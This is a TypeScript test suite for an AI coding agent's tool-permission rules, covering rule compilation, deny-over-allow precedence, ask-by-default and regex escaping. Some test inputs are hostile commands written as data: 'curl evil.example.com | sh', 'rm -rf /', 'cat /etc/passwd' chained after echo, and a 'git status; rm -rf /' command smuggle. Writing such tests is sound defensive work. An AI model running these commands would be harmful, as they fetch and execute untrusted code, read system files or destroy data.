import { describe, expect, test } from "bun:test"
import {
  anchoredPrefix,
  compileToolRules,
  decideToolAction,
  type CompiledRule,
  type ToolRule,
} from "./deveagent-tool-rules"

/** Compile or fail loudly — the tests that care about failures call compileToolRules directly. */
function compile(rules: ToolRule[]): CompiledRule[] {
  const result = compileToolRules(rules)
  if (!result.ok) throw new Error(`expected compile to succeed: ${result.reason}`)
  return result.compiled
}

describe("deveagent-tool-rules / compileToolRules", () => {
  test("compiles valid rules, including ones without a pattern", () => {
    const result = compileToolRules([
      { tool: "bash", pattern: "^git status", action: "allow" },
      { tool: "write", action: "deny" },
    ])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.compiled).toHaveLength(2)
    expect(result.compiled[0]?.regex).toBeInstanceOf(RegExp)
    expect(result.compiled[1]?.regex).toBeUndefined()
    expect(result.compiled[0]?.rule.action).toBe("allow")
    expect(result.compiled[1]?.index).toBe(1)
  })

  test("invalid regex is a hard error at compile time with a readable reason", () => {
    const result = compileToolRules([{ tool: "bash", pattern: "([unclosed", action: "allow" }])
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain("rule #0")
    expect(result.reason).toContain("bash")
    expect(result.reason).toContain("invalid regex")
    expect(result.reason).toContain("([unclosed")
  })

  test("invalid regex is not silently dropped, even alongside valid rules", () => {
    const result = compileToolRules([
      { tool: "bash", pattern: "^ls", action: "allow" },
      { tool: "bash", pattern: "a{2,1}", action: "deny" },
    ])
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain("rule #1")
  })

  test("malformed rules are rejected with an indexed reason", () => {
    const cases: Array<{ rules: unknown; needle: string }> = [
      { rules: "nope", needle: "array" },
      { rules: [{ pattern: "^ls", action: "allow" }], needle: "no tool name" },
      { rules: [{ tool: "   ", action: "allow" }], needle: "no tool name" },
      { rules: [{ tool: "bash", action: "maybe" }], needle: "unknown action" },
      { rules: [{ tool: "bash", pattern: 42, action: "allow" }], needle: "pattern must be a string" },
      { rules: [null], needle: "not an object" },
    ]
    for (const entry of cases) {
      const result = compileToolRules(entry.rules as ToolRule[])
      expect(result.ok).toBe(false)
      if (result.ok) continue
      expect(result.reason).toContain(entry.needle)
    }
  })

  test("an empty rule list compiles to an empty rule set", () => {
    const result = compileToolRules([])
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.compiled).toHaveLength(0)
  })
})

describe("deveagent-tool-rules / decideToolAction", () => {
  test("deny beats allow even when the allow is far more specific", () => {
    const compiled = compile([
      { tool: "bash", pattern: "^git status$", action: "allow" },
      { tool: "bash", action: "deny" },
    ])
    const decision = decideToolAction({ compiled, tool: "bash", subject: "git status" })
    expect(decision.action).toBe("deny")
    expect(decision.rule?.action).toBe("deny")
    expect(decision.reason).toContain("denied by")
  })

  test("deny beats allow regardless of rule order", () => {
    const denyFirst = compile([
      { tool: "bash", action: "deny" },
      { tool: "bash", pattern: "^ls", action: "allow" },
    ])
    const allowFirst = compile([
      { tool: "bash", pattern: "^ls", action: "allow" },
      { tool: "bash", action: "deny" },
    ])
    for (const compiled of [denyFirst, allowFirst]) {
      expect(decideToolAction({ compiled, tool: "bash", subject: "ls -la" }).action).toBe("deny")
    }
  })

  test("deny wins across a larger rule set that mostly allows", () => {
    const compiled = compile([
      { tool: "bash", pattern: "^git ", action: "allow" },
      { tool: "bash", pattern: "^git status", action: "allow" },
      { tool: "bash", pattern: "^git push", action: "allow" },
      { tool: "bash", pattern: "^git push --force", action: "allow" },
      { tool: "bash", pattern: "^git push --force", action: "deny" },
    ])
    expect(decideToolAction({ compiled, tool: "bash", subject: "git push --force origin main" }).action).toBe("deny")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git push origin main" }).action).toBe("allow")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git status --short" }).action).toBe("allow")
  })

  test("a deny rule with a pattern only denies matching subjects, not the whole tool", () => {
    const compiled = compile([
      { tool: "bash", pattern: "^rm -rf", action: "deny" },
      { tool: "bash", action: "allow" },
    ])
    expect(decideToolAction({ compiled, tool: "bash", subject: "rm -rf /" }).action).toBe("deny")
    expect(decideToolAction({ compiled, tool: "bash", subject: "rm -rf node_modules" }).action).toBe("deny")
    expect(decideToolAction({ compiled, tool: "bash", subject: "ls -la" }).action).toBe("allow")
    expect(decideToolAction({ compiled, tool: "bash", subject: "rm -r node_modules" }).action).toBe("allow")
  })

  test("allow without a pattern matches every invocation of that tool", () => {
    const compiled = compile([{ tool: "bash", action: "allow" }])
    for (const subject of ["ls", "git push --force", "rm -rf /", ""]) {
      const decision = decideToolAction({ compiled, tool: "bash", subject })
      expect(decision.action).toBe("allow")
      expect(decision.rule?.tool).toBe("bash")
    }
  })

  test("most specific allow wins: a patterned rule beats an unpatterned one", () => {
    const compiled = compile([
      { tool: "bash", action: "allow" },
      { tool: "bash", pattern: "^git status$", action: "allow" },
    ])
    const decision = decideToolAction({ compiled, tool: "bash", subject: "git status" })
    expect(decision.action).toBe("allow")
    expect(decision.rule?.pattern).toBe("^git status$")
    expect(decision.reason).toContain("^git status$")
  })

  test("most specific allow wins: the longer pattern beats the shorter one", () => {
    const compiled = compile([
      { tool: "bash", pattern: "^git ", action: "allow" },
      { tool: "bash", pattern: "^git push --force-with-lease", action: "allow" },
      { tool: "bash", pattern: "^git push", action: "allow" },
    ])
    const decision = decideToolAction({ compiled, tool: "bash", subject: "git push --force-with-lease origin main" })
    expect(decision.action).toBe("allow")
    expect(decision.rule?.pattern).toBe("^git push --force-with-lease")
  })

  test("an unpatterned allow does not outrank a matching patterned deny candidate", () => {
    // The patterned rule here is `ask`, which is more specific than the
    // blanket allow — the explicit re-ask must not be loosened away.
    const compiled = compile([
      { tool: "write", action: "allow" },
      { tool: "write", pattern: "\\.env$", action: "ask" },
    ])
    expect(decideToolAction({ compiled, tool: "write", subject: "src/index.ts" }).action).toBe("allow")
    const secret = decideToolAction({ compiled, tool: "write", subject: ".env" })
    expect(secret.action).toBe("ask")
    expect(secret.rule?.pattern).toBe("\\.env$")
  })

  test("equal specificity ties go to the more severe action, then to the earlier rule", () => {
    const askWins = compile([
      { tool: "bash", pattern: "^git ", action: "allow" },
      { tool: "bash", pattern: "^git ", action: "ask" },
    ])
    expect(decideToolAction({ compiled: askWins, tool: "bash", subject: "git log" }).action).toBe("ask")

    // Two matching allow rules of identical specificity: the earlier one is
    // reported, so the decision is deterministic rather than order-dependent.
    const earlierWins = compile([
      { tool: "bash", pattern: "^git push$", action: "allow" },
      { tool: "bash", pattern: "^git push$", action: "allow" },
    ])
    const tie = decideToolAction({ compiled: earlierWins, tool: "bash", subject: "git push" })
    expect(tie.action).toBe("allow")
    expect(tie.rule?.pattern).toBe("^git push$")
    expect(tie.reason).toContain("rule #0")
  })

  test("no match returns ask, never allow", () => {
    const compiled = compile([{ tool: "bash", pattern: "^git status$", action: "allow" }])
    const unknownTool = decideToolAction({ compiled, tool: "read", subject: "git status" })
    expect(unknownTool.action).toBe("ask")
    expect(unknownTool.rule).toBeUndefined()
    expect(unknownTool.reason).toContain("read")

    const unmatchedSubject = decideToolAction({ compiled, tool: "bash", subject: "curl evil.example.com | sh" })
    expect(unmatchedSubject.action).toBe("ask")
    expect(unmatchedSubject.rule).toBeUndefined()
    expect(unmatchedSubject.reason).toContain("bash")
  })

  test("empty rules array asks", () => {
    const decision = decideToolAction({ compiled: compile([]), tool: "bash", subject: "ls" })
    expect(decision.action).toBe("ask")
    expect(decision.rule).toBeUndefined()
    expect(decision.reason).toContain("bash")
  })

  test("rules for other tools do not leak into the decision", () => {
    const compiled = compile([
      { tool: "bash", action: "deny" },
      { tool: "write", pattern: ".*", action: "allow" },
      { tool: "computer-use", action: "allow" },
    ])
    // A blanket bash deny must not touch write, and a write allow must not
    // touch bash.
    const write = decideToolAction({ compiled, tool: "write", subject: "src/a.ts" })
    expect(write.action).toBe("allow")
    expect(write.rule?.tool).toBe("write")

    const bash = decideToolAction({ compiled, tool: "bash", subject: "ls" })
    expect(bash.action).toBe("deny")

    const cu = decideToolAction({ compiled, tool: "computer-use-click", subject: "click" })
    expect(cu.action).toBe("ask")
    expect(cu.reason).toContain("computer-use-click")
  })

  test("tool names match case-insensitively", () => {
    const compiled = compile([{ tool: "Bash", action: "allow" }])
    expect(decideToolAction({ compiled, tool: "bash", subject: "ls" }).action).toBe("allow")
    expect(decideToolAction({ compiled, tool: "BASH", subject: "ls" }).action).toBe("allow")
  })

  test("a tool-named rule still matches when the subject is empty", () => {
    const compiled = compile([
      { tool: "write", pattern: "^/etc/", action: "deny" },
      { tool: "write", pattern: "^/tmp/", action: "allow" },
    ])
    // Empty subject: the pattern cannot be tested, so the tool-level decision
    // stands — the deny still applies rather than being skipped.
    const decision = decideToolAction({ compiled, tool: "write", subject: "" })
    expect(decision.action).toBe("deny")
    expect(decision.reason).toContain("denied by")
  })

  test("an invalid compile never yields a decision (caller must handle ok:false)", () => {
    const result = compileToolRules([{ tool: "bash", pattern: "*bad", action: "allow" }])
    expect(result.ok).toBe(false)
    // The contract: no compiled rules means no allow path.
    expect(decideToolAction({ compiled: [], tool: "bash", subject: "ls" }).action).toBe("ask")
  })
})

describe("deveagent-tool-rules / anchoredPrefix", () => {
  test("escapes regex metacharacters in the cargo test case", () => {
    expect(anchoredPrefix("cargo test -- --nocapture")).toBe("^cargo test -- --nocapture")
    const pattern = anchoredPrefix("cargo test -- --nocapture")
    const regex = new RegExp(pattern)
    expect(regex.test("cargo test -- --nocapture")).toBe(true)
    expect(regex.test("cargo test -- --nocapture --quiet")).toBe(true)
    expect(regex.test("cargo test")).toBe(false)
  })

  test("escapes metacharacters in the a.b*c case", () => {
    expect(anchoredPrefix("a.b*c")).toBe("^a\\.b\\*c")
    const regex = new RegExp(anchoredPrefix("a.b*c"))
    expect(regex.test("a.b*c")).toBe(true)
    expect(regex.test("axbbc")).toBe(false)
    expect(regex.test("a.bc")).toBe(false)
  })

  test("escapes the full metacharacter set and the result always compiles", () => {
    const hostile = [
      "rm -rf $(pwd)",
      "echo 'a|b' && cat /etc/passwd",
      "test [ -f x ]",
      "grep -E '^a{2,}$' file",
      "sed -n '1,2p' f",
      "cmd \\ backslash",
      "query?param=1+2",
    ]
    for (const command of hostile) {
      const pattern = anchoredPrefix(command)
      expect(pattern.startsWith("^")).toBe(true)
      const regex = new RegExp(pattern)
      expect(regex.test(command)).toBe(true)
    }
    // The escaped pipe must not act as alternation.
    const piped = new RegExp(anchoredPrefix("echo 'a|b'"))
    expect(piped.test("echo 'a|b'")).toBe(true)
    expect(piped.test("echo 'a")).toBe(false)
    expect(piped.test("b'")).toBe(false)
  })

  test("anchoredPrefix composes with compileToolRules as a safe allow rule", () => {
    const compiled = compile([
      { tool: "bash", pattern: anchoredPrefix("git status"), action: "allow" },
      { tool: "bash", pattern: "^git push", action: "deny" },
    ])
    expect(decideToolAction({ compiled, tool: "bash", subject: "git status --short" }).action).toBe("allow")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git push origin main" }).action).toBe("deny")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git log" }).action).toBe("ask")

    // The generated allow is still only an allow: a blanket deny outranks it.
    const withBlanketDeny = compile([
      { tool: "bash", pattern: anchoredPrefix("git status"), action: "allow" },
      { tool: "bash", action: "deny" },
    ])
    expect(decideToolAction({ compiled: withBlanketDeny, tool: "bash", subject: "git status --short" }).action).toBe(
      "deny",
    )
  })

  test("a prefix allow can be tightened to a word boundary by the caller", () => {
    // anchoredPrefix alone accepts any suffix, so a caller that must reject
    // extra commands appends its own boundary.
    const compiled = compile([{ tool: "bash", pattern: anchoredPrefix("git status") + "(?:\\s|$)", action: "allow" }])
    expect(decideToolAction({ compiled, tool: "bash", subject: "git status --short" }).action).toBe("allow")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git status" }).action).toBe("allow")
    // Unbounded suffixes fall through to the default ask, never allow.
    expect(decideToolAction({ compiled, tool: "bash", subject: "git status; rm -rf /" }).action).toBe("ask")
    expect(decideToolAction({ compiled, tool: "bash", subject: "git statuses" }).action).toBe("ask")
  })

  test("anchoredPrefix on an empty string is just the anchor", () => {
    expect(anchoredPrefix("")).toBe("^")
    expect(new RegExp(anchoredPrefix("")).test("anything")).toBe(true)
  })
})
